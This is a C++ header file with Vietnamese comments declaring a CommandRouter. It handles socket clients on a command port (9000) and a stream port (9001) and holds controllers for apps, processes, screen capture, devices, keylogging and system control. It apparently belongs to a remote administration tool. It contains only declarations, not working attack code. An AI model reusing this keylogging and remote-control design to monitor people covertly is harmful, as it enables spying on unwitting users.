// CommandRouter.h (PHIEN BAN HYBRID)
#ifndef COMMANDROUTER_H
#define COMMANDROUTER_H

#include <winsock2.h>
#include <string>
#include <mutex>
#include "controllers/AppController.h"
#include "controllers/ProcessController.h"
#include "controllers/ScreenController.h"
#include "controllers/DeviceController.h"
#include "controllers/KeylogController.h"
#include "controllers/SystemController.h"

class CommandRouter
{
public:
    CommandRouter();
    void handleCommandClient(SOCKET client);                      // Xu ly cong lenh 9000
    void handleStreamClient(SOCKET client, std::string clientIP); // Xu ly cong stream 9001

private:
    std::mutex m_socketMutex; // Mutex cho cong lenh
    AppController m_appController;
    ProcessController m_processController;
    ScreenController m_screenController;
    DeviceController m_deviceController;
    KeylogController m_keylogController;
    SystemController m_systemController;
};
#endif